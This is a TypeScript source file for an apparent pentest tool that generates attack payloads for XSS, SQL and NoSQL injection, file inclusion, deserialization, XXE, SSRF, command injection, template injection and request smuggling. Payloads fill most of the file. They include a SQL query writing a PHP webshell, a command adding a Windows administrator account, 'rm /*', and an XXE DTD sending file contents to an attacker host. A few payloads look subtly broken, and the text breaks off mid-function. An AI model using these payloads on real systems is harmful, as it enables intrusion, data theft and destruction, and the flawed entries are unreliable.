/**
 * PayloadGenerator — generates ready-to-use attack payloads for authorized CTF/pentest ranges
 *
 * Categories:
 * - XSS: polyglots, filter bypasses per context (HTML attr / JS string / script tag / event handler)
 * - SQLi: per-DB (MySQL / MSSQL / PostgreSQL / Oracle / SQLite), per-context (UNION / boolean /
 *   time / error / stacked), per-WAF bypass (Cloudflare / ModSecurity / F5 / Akamai)
 * - LFI/RFI: PHP wrappers (php://filter / data:// / expect://), log poisoning, pearcmd.php,
 *   /proc/self/environ, Windows path traversal
 * - Deserialization: ysoserial-style gadget chains (CommonsCollections, Spring, Groovy, ...)
 * - Path traversal: encoded variants (..%2f, ..%5c, ..//, ....//)
 * - XXE: classic + out-of-band, PHP expect, Java
 * - SSRF: per-protocol (gopher / file / dict / http), bypass techniques
 * - Command injection: per-OS (Linux / Windows), per-context (system / exec / backtick / pipe)
 * - SSTI: per-engine (Jinja2 / Twig / Freemarker / Velocity / Smarty)
 * - CRLF injection / Smuggling
 * - NoSQLi: MongoDB / CouchDB / Cassandra — operator injection ($ne/$gt/$regex/$where), JS injection
 * - GraphQLi: introspection / batch / aliases / field-suggestion leak / IDOR via direct object ref
 * - JWT: alg=none / HS256-RS256 confusion / weak-secret brute / kid injection / jwk embed / x5u
 */

import { exec as execCb } from 'child_process'
import { promisify } from 'util'
import { deflateRawSync } from 'zlib'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

const exec = promisify(execCb)

type SqliDb = 'mysql' | 'mssql' | 'postgres' | 'oracle' | 'sqlite' | 'all'
type SqliContext = 'union' | 'boolean' | 'time' | 'error' | 'stacked' | 'all'
type WafBypass = 'cloudflare' | 'modsecurity' | 'f5' | 'akamai' | 'generic'
type XssContext = 'html' | 'attr' | 'js' | 'script' | 'event' | 'url' | 'all'
type LfiWrapper = 'php-filter' | 'data' | 'expect' | 'pearcmd' | 'proc-self' | 'log' | 'win' | 'all'
type RcePlatform = 'linux' | 'windows' | 'php' | 'python' | 'java' | 'node' | 'all'
type SerializationEngine = 'java' | 'php' | 'python' | 'dotnet' | 'node'
type NosqlDb = 'mongodb' | 'couchdb' | 'cassandra' | 'all'
type NosqlContext = 'auth-bypass' | 'extract' | 'js-injection' | 'blind' | 'all'
type JwtAttack = 'none' | 'alg-confusion' | 'weak-secret' | 'kid-injection' | 'jwk-embed' | 'x5u' | 'all'
type GraphqlOp = 'introspect' | 'batch' | 'aliases' | 'suggestions' | 'idor' | 'sqli-via-graphql' | 'all'

interface PayloadGeneratorInput {
  category:
    | 'xss' | 'sqli' | 'lfi' | 'rfi' | 'deserialization' | 'path_traversal'
    | 'xxe' | 'ssrf' | 'cmdi' | 'ssti' | 'crlf' | 'smuggle'
    | 'nosqli' | 'graphql' | 'jwt'
  // Category-specific:
  context?: XssContext | SqliContext | NosqlContext | string
  database?: SqliDb | NosqlDb
  waf?: WafBypass
  wrapper?: LfiWrapper
  platform?: RcePlatform
  engine?: SerializationEngine
  gadget?: string
  target_url?: string
  file?: string
  command?: string
  reflection?: string
  nosql_db?: NosqlDb
  attack?: JwtAttack | GraphqlOp
  endpoint?: string
  token?: string
}

function s(v: unknown): string {
  if (v === undefined || v === null) return ''
  return String(v)
}

// ── XSS payloads ───────────────────────────────────────────────────────────

function xssPayloads(ctx: XssContext): string {
  const out: string[] = ['[PayloadGenerator] XSS Payloads', '═'.repeat(60), '']
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```html')
    out.push(payload)
    out.push('```')
    out.push('')
  }

  if (ctx === 'html' || ctx === 'all') {
    push('Classic (HTML body context)', '<script>alert(1)</script>')
    push('SVG with script', '<svg/onload=alert(1)>')
    push('IMG with onerror', '<img src=x onerror=alert(1)>')
    push('Body with onload', '<body onload=alert(1)>')
    push('Input autofocus', '<input autofocus onfocus=alert(1)>')
    push('Marquee with onstart', '<marquee onstart=alert(1)>')
    push('Video with onerror', '<video><source onerror=alert(1)>')
    push('Details with ontoggle', '<details ontoggle=alert(1) open>')
  }

  if (ctx === 'attr' || ctx === 'all') {
    push('Event handler in attribute', '" autofocus onfocus=alert(1) x="')
    push('Mouse event', '" onmouseover=alert(1) x="')
    push('Src with javascript: protocol', '" src=javascript:alert(1) x="')
    push('Style with expression (legacy IE)', '" style="background:url(javascript:alert(1))')
    push('Style with @import', '" style="@import url(http://attacker/x.css);"')
  }

  if (ctx === 'js' || ctx === 'all') {
    push('JS string breakout', "'-alert(1)-'")
    push('JS template literal', '`${alert(1)}`')
    push('JS comment breakout', '*/alert(1)/*')
    push('JS line terminator', '&#10;alert(1)&#10;')
  }

  if (ctx === 'script' || ctx === 'all') {
    push('Script src', '<script src=http://attacker/x.js></script>')
    push('Script src encoded', '<script src=//attacker/x.js></script>')
    push('Script src with relative protocol', '<script src=//attacker/x.js>')
  }

  if (ctx === 'event' || ctx === 'all') {
    push('Event via tag nesting', '<a onmouseover=alert(1)>hover</a>')
    push('Event via form', '<form onsubmit=alert(1)><input type=submit>')
    push('Event via setTimeout', '<svg><script>setTimeout(alert(1),1)</script>')
  }

  if (ctx === 'url' || ctx === 'all') {
    push('javascript: protocol in href', 'javascript:alert(1)')
    push('data: protocol', 'data:text/html,<script>alert(1)</script>')
    push('vbscript: protocol (legacy IE)', 'vbscript:msgbox(1)')
  }

  // WAF bypass variants
  out.push('## WAF Bypass Variants (uppercase / mixed case / encoded)')
  out.push('```html')
  out.push('<ScRiPt>alert(1)</ScRiPt>')
  out.push('<script>alert(String.fromCharCode(88,83,83))</script>')
  out.push('<script>alert(/XSS/.source)</script>')
  out.push('<script>eval(atob("YWxlcnQoMSk="))</script>')
  out.push('<svg><animate onbegin=alert(1) attributeName=x>')
  out.push('<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>')
  out.push('<details open ontoggle=eval(atob("YWxlcnQoMSk=")) >')
  out.push('<!--><script>alert(1)</script>-->')
  out.push('```')
  out.push('')
  out.push('### Polyglot (works in HTML, JS string, JS template, URL, attribute, JSON, XML):')
  out.push('```html')
  out.push("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e")
  out.push('```')

  return out.join('\n')
}

// ── SQLi payloads ──────────────────────────────────────────────────────────

function sqliPayloads(db: SqliDb, ctx: SqliContext, waf: WafBypass): string {
  const out: string[] = ['[PayloadGenerator] SQL Injection Payloads', '═'.repeat(60), '']
  out.push(`Database: ${db}  Context: ${ctx}  WAF: ${waf}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```sql')
    out.push(payload)
    out.push('```')
    out.push('')
  }

  // ── UNION-based (extract data via UNION SELECT) ──
  if (ctx === 'union' || ctx === 'all') {
    push('UNION SELECT NULL (column count discovery)',
      "1' UNION SELECT NULL-- -")
    push('UNION SELECT columns (extract schema)',
      db === 'mssql' || db === 'all'
        ? "1' UNION SELECT NULL,table_name FROM information_schema.tables-- -"
        : "1' UNION SELECT NULL,table_name FROM information_schema.tables-- -")
    push('UNION SELECT (extract user + version)',
      "1' UNION SELECT NULL,concat(user,0x3a,version())-- -")
    if (db === 'mysql' || db === 'all') {
      push('MySQL — file read via UNION',
        "1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- -")
      push('MySQL — write webshell via UNION',
        "1' UNION SELECT NULL,'<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'-- -")
    }
  }

  // ── Boolean-based blind ──
  if (ctx === 'boolean' || ctx === 'all') {
    push('Boolean blind (true condition)',
      "1' AND 1=1-- -")
    push('Boolean blind (false condition)',
      "1' AND 1=2-- -")
    push('Substring extraction',
      "1' AND substring(user(),1,1)='a'-- -")
    push('Substring extraction (BMP)',
      "1' AND ascii(substring(user(),1,1))>64-- -")
  }

  // ── Time-based blind ──
  if (ctx === 'time' || ctx === 'all') {
    push('MySQL — sleep',
      "1' AND SLEEP(5)-- -")
    push('PostgreSQL — pg_sleep',
      "1'; SELECT pg_sleep(5)--")
    push('MSSQL — waitfor delay',
      "1'; WAITFOR DELAY '0:0:5'--")
    push('Oracle — DBMS_PIPE',
      "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--")
    push('SQLite — randomblob (slower)',
      "1' AND 1=randomblob(500000000)--")
  }

  // ── Error-based ──
  if (ctx === 'error' || ctx === 'all') {
    push('MySQL — extractvalue',
      "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -")
    push('MySQL — updatexml',
      "1' AND updatexml(1,concat(0x7e,user(),0x7e),1)-- -")
    push('MSSQL — convert',
      "1' AND CONVERT(int, (SELECT @@version))-- -")
    push('PostgreSQL — cast',
      "1' AND CAST((SELECT version()) AS int)-- -")
    push('Oracle — ctxsys.drithsx.sn',
      "1' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1-- -")
  }

  // ── Stacked queries (DML) ──
  if (ctx === 'stacked' || ctx === 'all') {
    push('MySQL — stacked INSERT',
      "1'; INSERT INTO users(pass) VALUES('pwned')-- -")
    push('PostgreSQL — stacked INSERT (returns no result)',
      "1'; INSERT INTO users(pass) VALUES('pwned')--")
  }

  // ── WAF bypass — comment-based ──
  if (waf === 'cloudflare' || waf === 'modsecurity' || waf === 'f5' || waf === 'akamai' || waf === 'generic') {
    out.push(`## WAF Bypass Variants (target: ${waf})`)
    out.push('```sql')
    out.push('-- Inline comment insertion:')
    out.push("1'/**/UNION/**/SELECT/**/NULL,user()-- -")
    out.push("1'/*!UNION*/ /*!SELECT*/ NULL,user()-- -")
    out.push("1'%0aUNION%0aSELECT%0aNULL,user()-- -")
    out.push('')
    out.push('-- Case variation:')
    out.push("1' uNiOn SeLeCt NuLl,user()-- -")
    out.push('')
    out.push('-- Double URL encoding (for double-decoding WAFs):')
    out.push("1'%2527%2520UNION%2520SELECT%2520NULL%252Cuser()--%2520-")
    out.push('')
    out.push('-- HPP (HTTP Parameter Pollution):')
    out.push("?id=1&id=' UNION SELECT NULL,user()-- -")
    out.push('')
    out.push('-- Unicode normalization:')
    out.push("1'%20UNION%20SELECT%20NULL,user()-- -")
    out.push('```')
    out.push('')
    if (waf === 'cloudflare') {
      out.push('### Cloudflare specific: random case + chunked comments + null byte at end')
      out.push("```sql")
      out.push("1'/*!uNiOn*/%0a/*!sElEcT*/%0aNULL,user()%00-- -")
      out.push("```")
    }
    if (waf === 'modsecurity') {
      out.push('### ModSecurity specific: versioned comments + char concat (MySQL)')
      out.push("```sql")
      out.push("1'/*!50000UNION*/ /*!50000SELECT*/ NULL,concat(0x7e,user(),0x7e)-- -")
      out.push("```")
    }
    if (waf === 'f5') {
      out.push('### F5 BIG-IP ASM specific: parameter encoding + chunked transfer')
      out.push("```sql")
      out.push("# Use chunked transfer + URL-encode each keyword separately")
      out.push("# id=%55%4e%49%4f%4e%20%53%45%4c%45%43%54 (UNION SELECT URL-encoded)")
      out.push("```")
    }
    if (waf === 'akamai') {
      out.push('### Akamai specific: avoid quoted strings (use hex/concat)')
      out.push("```sql")
      out.push("1' UNION SELECT NULL,0x75736572()-- -  -- user() as hex")
      out.push("```")
    }
  }

  return out.join('\n')
}

// ── LFI payloads ───────────────────────────────────────────────────────────

function lfiPayloads(wrapper: LfiWrapper, file: string): string {
  const out: string[] = ['[PayloadGenerator] LFI Payloads', '═'.repeat(60), '']
  out.push(`Wrapper: ${wrapper}  Target file: ${file || '/etc/passwd'}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```')
    out.push(payload)
    out.push('```')
    out.push('')
  }

  if (wrapper === 'php-filter' || wrapper === 'all') {
    push('PHP filter (base64 encode then read)',
      `php://filter/convert.base64-encode/resource=${file || 'index.php'}`)
    push('PHP filter (rot13)',
      `php://filter/read=string.rot13/resource=${file || 'index.php'}`)
    push('PHP filter (UTF-7 chain to bypass WAF)',
      `php://filter/convert.iconv.UTF-8.UTF-7/resource=${file || 'index.php'}`)
    push('PHP filter (chain to RCE via iconv — minimal)',
      `php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.iconv.UTF-8.UTF16LE|convert.base64-decode/resource=${file || 'index.php'}`)
  }
  if (wrapper === 'data' || wrapper === 'all') {
    push('data:// (PHP, allow_url_include=on)',
      `data://text/plain;base64,${Buffer.from('<?php system("id"); ?>').toString('base64')}`)
    push('data:// (with chain to read file)',
      `data://text/plain,<?php system("cat ${file || '/etc/passwd'}"); ?>`)
  }
  if (wrapper === 'expect' || wrapper === 'all') {
    push('expect:// (PHP, RCE via expect extension)',
      `expect://id`)
  }
  if (wrapper === 'pearcmd' || wrapper === 'all') {
    push('pearcmd.php (PHP, RCE via register_argc_argv=on)',
      `?+config-create+/&file=/usr/share/php/pearcmd.php&/<?php system('id');?>+/tmp/x.php`)
    push('pearcmd.php (curl-friendly)',
      `/?+config-create+/<?=system('id')?>+/tmp/x.php&/<?=phpinfo()?>+/tmp/y.php`)
  }
  if (wrapper === 'proc-self' || wrapper === 'all') {
    push('/proc/self/environ (read env vars for secrets)',
      '../../../../proc/self/environ')
    push('/proc/self/fd/N (read open file descriptors)',
      '../../../../proc/self/fd/0')
  }
  if (wrapper === 'log' || wrapper === 'all') {
    push('Apache access log poisoning',
      '../../../../var/log/apache2/access.log')
    push('Apache error log poisoning',
      '../../../../var/log/apache2/error.log')
    push('Nginx access log poisoning',
      '../../../../var/log/nginx/access.log')
    push('SSH auth log poisoning (RCE via SSH username)',
      '../../../../var/log/auth.log')
    push('Mail log (Postfix)',
      '../../../../var/log/mail.log')
    push('PHP-FPM (inject into User-Agent then read log)',
      'Step 1: curl -A "<?php system(\\"id\\"); ?>" http://target/anything\nStep 2: GET /var/log/nginx/access.log (the payload will execute)')
  }
  if (wrapper === 'win' || wrapper === 'all') {
    push('Windows traversal (forward slash)',
      `../../../../windows/win.ini`)
    push('Windows traversal (backslash)',
      `..\\..\\..\\..\\windows\\win.ini`)
    push('Windows traversal (double-encoded)',
      `..%252f..%252f..%252f..%252fwindows/win.ini`)
    push('Windows — IIS UNC path',
      `\\\\attacker-share\\evil.dll`)
    push('Windows — file:// protocol',
      `file:///c:/windows/win.ini`)
  }
  // WAF bypass for LFI
  out.push('## Path Traversal WAF Bypass Variants')
  out.push('```')
  out.push('....//....//....//etc/passwd          (double-dot bypass)')
  out.push('..%2f..%2f..%2f..%2fetc/passwd       (URL-encoded slash)')
  out.push('..%252f..%252f..%252f..%252fetc/passwd (double URL-encoded)')
  out.push('..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd (overlong UTF-8)')
  out.push('..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd (fullwidth slash)')
  out.push('/etc/./passwd                          (dot injection)')
  out.push('....//....//....//etc/passwd          (reversed double-slash)')
  out.push('/etc%00/passwd                          (null byte — old PHP)')
  out.push('..;/..;/..;/..;/etc/passwd            (semicolon path parameter — Tomcat)')
  out.push('```')
  return out.join('\n')
}

// ── RFI payloads ───────────────────────────────────────────────────────────

function rfiPayloads(platform: RcePlatform, command: string): string {
  const out: string[] = ['[PayloadGenerator] RFI / RCE Payloads', '═'.repeat(60), '']
  out.push(`Platform: ${platform}  Command: ${command || 'id'}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```')
    out.push(payload)
    out.push('```')
    out.push('')
  }

  if (platform === 'php' || platform === 'all') {
    push('PHP — allow_url_include=On',
      `http://attacker/shell.php`)
    push('PHP — with php://filter for log poisoning',
      `php://input  (POST body: <?php system('${command || 'id'}'); ?>)`)
    push('PHP — expect:// (expect extension)',
      `expect://${command || 'id'}`)
  }
  if (platform === 'python' || platform === 'all') {
    push('Python — pickle deserialization (Python 2)',
      `__import__('os').system('${command || 'id'}')  # base64 + pickle`)
    push('Python — YAML deserialization (yaml.load)',
      `!!python/object/apply:os.system ['${command || 'id'}']`)
    push('Python — eval() injection',
      `eval("__import__('os').system('${command || 'id'}')")`)
  }
  if (platform === 'java' || platform === 'all') {
    push('Java — Runtime.exec (single command)',
      `Runtime.getRuntime().exec("${command || 'id'}")`)
    push('Java — ProcessBuilder with array',
      `new ProcessBuilder(new String[]{"bash","-c","${command || 'id'}"}).start()`)
    push('Java — OGNL injection (Struts2)',
      `%{(#a=@java.lang.Runtime@getRuntime().exec('${command || 'id'}'))}`)
    push('Java — SpEL injection (Spring)',
      `${'${'}T(java.lang.Runtime).getRuntime().exec('${command || 'id'}')${'}'}`)
  }
  if (platform === 'node' || platform === 'all') {
    push('Node.js — child_process.exec',
      `require('child_process').execSync('${command || 'id'}')`)
    push('Node.js — eval() injection',
      `eval("require('child_process').execSync('${command || 'id'}')")`)
  }
  if (platform === 'linux' || platform === 'all') {
    push('Linux — bash backtick injection',
      '`id`')
    push('Linux — bash $() injection',
      '$(id)')
    push('Linux — pipe injection',
      '| id')
    push('Linux — semicolon chaining',
      '; id')
    push('Linux — newline injection (HTTP header)',
      '%0aid')
    push('Linux — wildcard (rm exploit)',
      'rm /* ')
  }
  if (platform === 'windows' || platform === 'all') {
    push('Windows — cmd chaining',
      '& whoami')
    push('Windows — pipe',
      '| whoami')
    push('Windows — PowerShell encoded',
      `powershell -enc ${Buffer.from(command || 'whoami', 'utf16le').toString('base64')}`)
    push('Windows — net user add',
      'net user pwned P@ssw0rd /add && net localgroup administrators pwned /add')
  }
  return out.join('\n')
}

// ── Deserialization payloads (ysoserial-style) ──────────────────────────────

function deserializationPayloads(engine: SerializationEngine, gadget: string): string {
  const out: string[] = ['[PayloadGenerator] Deserialization Payloads', '═'.repeat(60), '']
  out.push(`Engine: ${engine}  Gadget: ${gadget || 'auto'}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```')
    out.push(payload)
    out.push('```')
    out.push('')
  }

  if (engine === 'java' || engine === 'node') {
    // Java: ysoserial-style
    const gadgets = [
      'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3',
      'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7',
      'CommonsBeanutils1', 'Spring1', 'Spring2', 'Groovy1', 'ROME', 'Click1',
      'JRMPClient', 'C3P0', 'Clojure', 'Hibernate1',
    ]
    for (const g of gadgets) {
      if (gadget && gadget !== 'auto' && !g.toLowerCase().includes(gadget.toLowerCase())) continue
      push(`${g} — generate command execution payload`,
        `java -jar ysoserial.jar ${g} 'id' > payload.bin\n` +
        `# Send as Cookie, JSON value, XML node, etc.\n` +
        `# Decode target: rO0AB... (base64 of serialized Java)`)
    }
    out.push('### Detection (faster than running ysoserial):')
    out.push('```bash')
    out.push('ysoserial/ysoserial-detect  payload.bin   # 3-5x faster than full ysoserial')
    out.push('# For HTTP: send in various Content-Types and watch for errors:')
    out.push('curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.bin http://target/endpoint')
    out.push('```')
    out.push('')
  }

  if (engine === 'php') {
    push('PHP — serialize() with object injection',
      `O:8:"stdClass":1:{s:4:"prop";s:2:"id";}`)
    push('PHP — __destruct gadget (example)',
      `O:8:"BadClass":0:{}    # if class BadClass has __destruct running eval`)
    push('PHP — Phar deserialization (file_exists trigger)',
      `phar://path/to/uploaded.phar`)
    push('PHP — Laravel/RCE via unserialize (composer libraries)',
      `phpggc Laravel/RCE1 'id' -b`)
  }

  if (engine === 'python') {
    push('Python — pickle opcode (manual)',
      `cos\\nsystem\\n(S'id'\\ntR.`)
    push('Python — PyYAML load (RCE)',
      `!!python/object/apply:os.system ['id']`)
    push('Python — __reduce__ in dict',
      `{"__reduce__": [os.system, ["id"]]}`)
  }

  if (engine === 'dotnet') {
    push('.NET — ysoserial.net',
      `ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "id" -o base64`)
    push('.NET — ObjectDataProvider gadget',
      `ysoserial.net -g ObjectDataProvider -f Xaml -c "id"`)
    push('.NET — TextFormattingRunProperties gadget',
      `ysoserial.net -g TextFormattingRunProperties -f Json.Net -c "id"`)
  }

  return out.join('\n')
}

// ── XXE payloads ───────────────────────────────────────────────────────────

function xxePayloads(file: string): string {
  const out: string[] = ['[PayloadGenerator] XXE Payloads', '═'.repeat(60), '']
  out.push(`Target file: ${file || '/etc/passwd'}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```xml')
    out.push(payload)
    out.push('```')
    out.push('')
  }
  push('Classic file read',
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://${file || '/etc/passwd'}">]><root>&xxe;</root>`)
  push('PHP expect:// (RCE)',
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>`)
  push('Out-of-band via HTTP (no in-band exfil)',
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/xxe.dtd"> %xxe;]><root>&exfil;</root>`)
  push('Parameter entity OOB (staged)',
    `<!-- xxe.dtd on attacker: -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=${file || '/etc/passwd'}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?data=%file;'>">
%eval;
%exfil;`)
  push('XXE in JSON (when endpoint accepts JSON, e.g. FastJSON)',
    JSON.stringify({
      name: "test",
      age: { "$ref": `file://${file || '/etc/passwd'}` },
    }, null, 2))
  return out.join('\n')
}

// ── SSRF payloads ──────────────────────────────────────────────────────────

function ssrfPayloads(target: string): string {
  const out: string[] = ['[PayloadGenerator] SSRF Payloads', '═'.repeat(60), '']
  out.push(`Internal target: ${target || 'http://127.0.0.1:8080'}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```')
    out.push(payload)
    out.push('```')
    out.push('')
  }
  push('HTTP basic probe',
    target || 'http://127.0.0.1:8080/admin')
  push('File protocol (read local file)',
    `file:///etc/passwd`)
  push('Dict protocol (port scan / service fingerprint)',
    `dict://127.0.0.1:22`)
  push('Gopher protocol (POST to internal service)',
    `gopher://127.0.0.1:80/_POST%20/manage%20HTTP/1.1%0D%0AHost:%20target%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2011%0D%0A%0D%0Acmd=whoami`)
  push('LDAP protocol (info leak)',
    `ldap://127.0.0.1:389/cn=admin`)
  push('FTP protocol',
    `ftp://127.0.0.1/`)
  push('SFTP protocol',
    `sftp://127.0.0.1/`)
  push('TFTP protocol',
    `tftp://127.0.0.1/`)

  out.push('## Bypass IP blacklists')
  out.push('```')
  out.push('http://2130706433/                     (decimal IP for 127.0.0.1)')
  out.push('http://017700000001/                    (octal)')
  out.push('http://0x7f000001/                     (hex)')
  out.push('http://127.1/                          (short form)')
  out.push('http://0/                              (zero IP — many libs accept as 127.0.0.1)')
  out.push('http://[::1]/                          (IPv6 loopback)')
  out.push('http://[::ffff:127.0.0.1]/             (IPv6-mapped IPv4)')
  out.push('http://127.0.0.1.nip.io/               (DNS rebinding via nip.io)')
  out.push('http://localtest.me/                   (resolves to 127.0.0.1)')
  out.push('http://vcap.me/                        (resolves to 127.0.0.1)')
  out.push('http://lacolhost.com/                  (l instead of 1 in localhost)')
  out.push('http://127.0.0.1./                     (trailing dot)')
  out.push('http://①②⑦.⓪.⓪.①/                   (unicode digits)')
  out.push('```')
  out.push('')
  out.push('## Bypass URL parse (parser confusion)')
  out.push('```')
  out.push('http://attacker.com@127.0.0.1/         (URL creds — frontend sees attacker.com, backend goes to 127.0.0.1)')
  out.push('http://attacker.com#@127.0.0.1/         (fragment bypass)')
  out.push('http://attacker.com\\@127.0.0.1/        (backslash bypass)')
  out.push('http://attacker.com?.127.0.0.1/         (subdomain prepended)')
  out.push('```')
  return out.join('\n')
}

// ── Path traversal payloads ────────────────────────────────────────────────

function pathTraversalPayloads(file: string): string {
  const out: string[] = ['[PayloadGenerator] Path Traversal Payloads', '═'.repeat(60), '']
  out.push(`Target file: ${file || '/etc/passwd'}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```')
    out.push(payload)
    out.push('```')
    out.push('')
  }
  const base = `../../../etc/passwd`
  push('Classic', base)
  push('Absolute (Linux)', file || '/etc/passwd')
  push('Absolute (Windows)', 'C:\\Windows\\System32\\drivers\\etc\\hosts')
  push('URL-encoded', encodeURI(base))
  push('Double URL-encoded', encodeURI(encodeURI(base)))
  push('Null byte (legacy)', base + '%00.jpg')
  push('Unicode', base.replace(/[.]/g, '%u002e'))
  push('UTF-8 overlong', base.replace(/[.]/g, '%c0%ae'))
  push('Backslash (Windows)', base.replace(/[/]/g, '\\'))
  push('UNC path (Windows)', '\\\\attacker\\share\\evil.dll')
  push('Path traversal with prefix',
    '/var/www/images/../../../etc/passwd')
  push('Tomcat specific (allows ../ via semicolon)',
    '/..;/..;/..;/..;/etc/passwd')
  push('Wildcard (file read via glob)',
    '/var/www/files/*')
  push('Symlink following (Linux)',
    'ln -s /etc/passwd /var/www/link.txt')
  return out.join('\n')
}

// ── SSTI payloads ──────────────────────────────────────────────────────────

function sstiPayloads(engine: string): string {
  const out: string[] = ['[PayloadGenerator] SSTI Payloads', '═'.repeat(60), '']
  out.push(`Engine: ${engine}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```')
    out.push(payload)
    out.push('```')
    out.push('')
  }
  if (engine === 'jinja2' || engine === 'all') {
    push('Jinja2 (Python Flask) — RCE',
      "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}")
    push('Jinja2 — config leak',
      "{{config}}")
    push('Jinja2 — bypass filter (attr)',
      "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}")
  }
  if (engine === 'twig' || engine === 'all') {
    push('Twig (PHP) — RCE',
      "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}")
    push('Twig — file read',
      "{{'/etc/passwd'|file_excerpt(1)}}")
  }
  if (engine === 'freemarker' || engine === 'all') {
    push('FreeMarker (Java) — RCE',
      '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}')
    push('FreeMarker — API alternative',
      '${"freemarker.template.utility.Execute"?new()("id")}')
  }
  if (engine === 'velocity' || engine === 'all') {
    push('Velocity (Java) — RCE',
      '#set($e="e")${Class.forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke(Runtime.getRuntime().getMethod("exec",$e.getClass()).invoke(null),"id")}')
  }
  if (engine === 'smarty' || engine === 'all') {
    push('Smarty (PHP) — RCE',
      '{system("id")}')
    push('Smarty — file read',
      "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']);?>\",self::clearConfig())}")
  }
  return out.join('\n')
}

// ── CRLF / Smuggling payloads ──────────────────────────────────────────────

function crlfPayloads(): string {
  const out: string[] = ['[PayloadGenerator] CRLF Injection & Smuggling Payloads', '═'.repeat(60), '']
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```')
    out.push(payload)
    out.push('```')
    out.push('')
  }
  push('CRLF in URL',
    'http://target/%0d%0aSet-Cookie:admin=true')
  push('CRLF in header injection',
    'en-US,en;q=0.9%0d%0aX-Admin:true')
  push('HTTP Request Smuggling — CL.TE',
    'POST / HTTP/1.1\nHost: target\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\r\n\r\nG')
  push('HTTP Request Smuggling — TE.CL',
    'POST / HTTP/1.1\nHost: target\nContent-Length: 4\nTransfer-Encoding: chunked\n\n5c\r\nGPOST /admin HTTP/1.1\r\nHost: target\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n')
  push('HTTP/2 Downgrade smuggling',
    'h2c://target — downgrade to HTTP/1.1 mid-connection')
  return out.join('\n')
}

// ── NoSQL Injection payloads ───────────────────────────────────────────────

function nosqliPayloads(db: NosqlDb, ctx: NosqlContext): string {
  const out: string[] = ['[PayloadGenerator] NoSQL Injection Payloads', '═'.repeat(60), '']
  out.push(`Database: ${db}  Context: ${ctx}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```json')
    out.push(payload)
    out.push('```')
    out.push('')
  }

  // MongoDB operator injection (string context — JSON body)
  if (db === 'mongodb' || db === 'all') {
    if (ctx === 'auth-bypass' || ctx === 'all') {
      push('MongoDB — auth bypass via $ne (login form)',
        '{"username":"admin","password":{"$ne":""}}')
      push('MongoDB — auth bypass via $gt',
        '{"username":"admin","password":{"$gt":""}}')
      push('MongoDB — auth bypass via $exists',
        '{"username":"admin","password":{"$exists":true}}')
      push('MongoDB — auth bypass via $regex',
        '{"username":"admin","password":{"$regex":".*"}}')
      push('MongoDB — auth bypass via $in array',
        '{"username":"admin","password":{"$in":["","x"]}}')
      push('MongoDB — query param style (URL-encoded JSON in REST)',
        'username=admin&password[$ne]=x')
      push('MongoDB — nested operator array (Express body-parser quirk)',
        'username=admin&password[$gt]=&__proto__[password]=$ne')
      push('MongoDB — empty operator (matches nothing vs matches anything depending on schema)',
        '{"password":{}}')
    }
    if (ctx === 'extract' || ctx === 'all') {
      push('MongoDB — character-by-character extraction via $regex',
        '{"username":"admin","password":{"$regex":"^a"}}')
      push('MongoDB — fast extraction with $where (any char check)',
        '{"$where":"this.password.charAt(0)==\'a\'"}')
      push('MongoDB — full dump via $where JavaScript',
